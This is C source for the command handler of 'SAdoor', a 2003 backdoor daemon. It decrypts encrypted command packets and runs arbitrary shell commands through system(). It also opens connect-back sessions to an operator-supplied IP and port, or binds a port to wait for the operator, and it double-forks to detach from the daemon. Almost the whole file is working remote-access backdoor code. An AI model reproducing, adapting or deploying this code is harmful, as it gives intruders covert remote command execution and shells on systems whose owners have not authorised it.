/*
 *  File: command.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor command translator.
 *  Version: 1.0
 *  Date: Tue Jan  7 23:24:15 CET 2003
 *  
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *      
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF 
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "sadoor.h"
#include "sadc.h"
#include "net.h"
#include "log.h"
#include "command.h"

/* Global variables */
extern struct sa_options opt;
extern struct sa_pkts *packets;

/* Private routines */
static int setup_command(struct sacmd *, size_t, struct bfish_key *, struct timeval *);

/*
 * Setup SAdoor command
 * Returns 1 on success and 0 on error.
 */
static int
setup_command(struct sacmd *command, size_t len, struct bfish_key *bk, struct timeval *saveiv)
{
	if (len == 0)
		return(1);

    if (len < CMD_HDR_LEN) {
        log_priv("Error: Received command shorter than minimum length\n");
        return(0);
    }

	if (saveiv != NULL) {
		saveiv->tv_sec = ntohl(*((uint32_t *)&command->iv[0]));
		saveiv->tv_usec = ntohl(*((uint32_t *)&command->iv[4]));
	}

    /* Decrypt command (IV should be in network byte order) */
#ifndef SADOOR_DISABLE_ENCRYPTION
    bfish_cfb_decrypt((uint8_t *)&(command->length), len-8, command->iv, 8, bk);
#endif /* SADOOR_DISABLE_ENCRYPTION */

    /* Convert to host endian */
    command->length = ntohs(command->length);
    command->code = ntohs(command->code);

    if ( (len - CMD_HDR_LEN) < GET_DATA_LENGTH(command)) {
        log_priv("Error: Length of data (%u bytes) is shorter than length of "
            "command (%u bytes), bad key?\n", len, GET_DATA_LENGTH(command));
        return(0);
    }

	return(1);	
}

/*
 * Examine received command and perform the
 * desired action. Returns -1 on error, and 0 on success.
 */
int
handle_command(u_char *cmd, size_t len, struct bfish_key *bk)
{
	pid_t pid;
	u_char setupcmd	= 1;	/* Flag telling that command needs to be set up */
	struct sacmd command;
	u_char *pt;

	if (len > sizeof(struct sacmd)) {
		log_priv("Error: Command data to large (%u bytes, max = %u bytes)\n",
			len, sizeof(struct sacmd));
		return(-1);
	}

    /* Copy command for child to use */
    memcpy((u_char *)&command, cmd, len);

    /* Check for replay attack/clock skew */
	if ((len != 0) && (opt.sao_protrep == 1)) {
		struct timeval tv;

		if (!setup_command(&command, len, bk, &tv))
			return(-1);

		/* Flag that command has been setup */
		setupcmd = 0;

		/* Check command code first to avoid DOS by 
		 * sending bad command packets with a high timestamp */
		if (!ISVALID_COMMANDCODE(command.code)) {
        	log_priv("Command packet error: Unrecognized command code: "
				"0x%02x\n", command.code);
			return(-1);				
		}

		if (replay_check(tv.tv_sec, tv.tv_usec) == 0)
			return(-1);

		if (replay_add(tv.tv_sec, tv.tv_usec) < 0)
			return(-1);
	}

	/* Relese us from SAdoor */
	if ( (pid = fork()) < 0) {
		log_priv("Error: fork(): %s", strerror(errno));
		return(-1);
	}

	/* SAdoor/parent, wait for first child to exit */
	else if (pid > 0) {
		wait(NULL);
		return(0);
	}

	/* Fork again to get init as a parent and let SAdoor continue to work. */
	if ( (pid = fork()) < 0) {
		log_priv("Error: fork(): %s", strerror(errno));
		exit(EXIT_FAILURE);
	}
	/* Exit first child */
	else if (pid > 0)
		_exit(EXIT_SUCCESS);

	/* Become a process group and session group leader */
	if (setsid() < 0) {
		log_priv("Error: setsid(): %s", strerror(errno));
		exit(EXIT_FAILURE);
	}

	/* Free unused memory */
	free_pkts(packets);

/* TODO! Close stuff inherited from SAdoor */
/* cap_close(cap) */

	/* Empty command, run default command if set or bail */
	if (len == 0) {
		int sysret; 

		if (opt.sao_defcmd == NULL) {
			log_priv("Warning: Received NULL command, but %s not set in %s\n", 
				SACONF_DEFAULT_CMD, opt.sao_saconf);
			exit(EXIT_FAILURE);
		}
	
		log_priv("Received NULL command\n");

		if (opt.sao_privbose > 1)
			log_priv("Running default command \"%s\"\n", opt.sao_defcmd);
		
		if ( (sysret = system(opt.sao_defcmd)) == -1)
			log_priv("system(): %s", strerror(errno));

		exit(sysret);
	}

	/* Setup command if replay protection is disabled */
	if ((setupcmd) && !setup_command(&command, len, bk, NULL))
		exit(EXIT_FAILURE);

	/* Simple shell command */
	if (command.code == SADOOR_CMD_RUN) {
		int sysret;

		/* Null terminate */
		*((u_char *)&command.data + GET_DATA_LENGTH(&command)) = '\0';

		if (opt.sao_nosingle == 1) {
			log_priv("Warning: Single command disabled, "
				"refusing to run \"%s\"\n", (u_char *)&command.data);
			exit(EXIT_FAILURE);
		}
	
		log_priv("Received RUN command\n");
			
		if (opt.sao_privbose > 1)
			log_priv("Running command \"%s\"\n", (u_char *)&command.data);

		if ( (sysret = system((u_char *)&command.data)) == -1)
			log_priv("system(): %s", strerror(errno));
		
		exit(sysret);
	}
	/* Connect back to client */
	if (command.code == SADOOR_CMD_CONNECT) {
		struct connect_cmd *ccmd;
		int sock_fd;
		
		log_priv("Received CONNECT BACK command\n");

		if (GET_DATA_LENGTH(&command) < sizeof(struct connect_cmd)) {
			log_priv("Error: CONNECT BACK command data is to short to "
				"contain IPv4 address and TCP port\n");
			exit(EXIT_FAILURE);
		}
	
		ccmd = (struct connect_cmd *)&command.data;

		if (opt.sao_noconnect == 1) {
			log_priv("Warning: Connect command disabled, "
				"refusing to connect back to %s:%u\n",
				net_ntoa(ccmd->ip, NULL), ntohs(ccmd->port));
			exit(EXIT_FAILURE);
		}

		/* Connect back and get the socket descriptor */
		if ( (sock_fd = conn_connect(ccmd->ip, ccmd->port)) < 0)
			exit(EXIT_FAILURE);

		/* Handle connection */
		exit(handle_connection(sock_fd, bk));
	}

	/* Wait for connecting client */
	else if (command.code == SADOOR_CMD_ACCEPT) {
		struct accept_cmd *acmd;
		int sock_fd;
		int client_fd;
		
		log_priv("Received ACCEPT command\n");

		if (GET_DATA_LENGTH(&command) < sizeof(struct accept_cmd)) {
			log_priv("Error: ACCEPT command data is to short to "
				"contain necessary information\n");
			exit(EXIT_FAILURE);
		}

		acmd = (struct accept_cmd *)&command.data;

		if (opt.sao_noaccept == 1) {
			log_priv("Warning: Accept command disabled, "
				"refusing to listen on port %u for %s:%u\n",
				ntohs(acmd->lport), net_ntoa(acmd->cip, NULL), 
				ntohs(acmd->cport));
			exit(EXIT_FAILURE);
		}

		/* Attempt to bind socket to the supplied address */
		if ( (sock_fd = conn_bindsock(INADDR_ANY, acmd->lport, NULL)) < 0) {
			
			if ((opt.sao_resolve == 1) && ((pt = net_hostname2(acmd->cip)) != NULL)) {
				log_priv("Error: Failed to bind to port %u for connecting "
					"client %s:%u (%s)\n", ntohs(acmd->lport), 
					net_ntoa(acmd->cip, NULL), ntohs(acmd->cport), pt);
			}
			else {
				log_priv("Error: Failed to bind to port %u for connecting "
					"client %s:%u\n", ntohs(acmd->lport),
					net_ntoa(acmd->cip, NULL),  ntohs(acmd->cport));
			}
			exit(EXIT_FAILURE);
		}
		
		if (opt.sao_privbose > 1) {
			
			if ((opt.sao_resolve == 1) && ((pt = net_hostname2(acmd->cip)) != NULL)) {
				log_priv("Awaiting connection from %s:%u (%s) to local port %u\n",
					net_ntoa(acmd->cip, NULL), ntohs(acmd->cport), pt, ntohs(acmd->lport));
			}
			else {
				log_priv("Awaiting connection from %s:%u to local port %u\n",
					net_ntoa(acmd->cip, NULL), ntohs(acmd->cport), ntohs(acmd->lport));
			}
		}
	
		/* Await connection from client */
		if ( (client_fd = conn_accept(sock_fd, opt.sao_ctout, 
				acmd->cip, acmd->cport)) < 0)
			exit(EXIT_FAILURE);

		/* Handle this connection */
		exit(handle_connection(client_fd, bk));
	}
	else {
		log_priv("Command packet error: Unrecognized command code: "
			"0x%02x\n", command.code);
		exit(EXIT_FAILURE);
	}
	
	/* Unreached */
	return(EXIT_FAILURE);
}
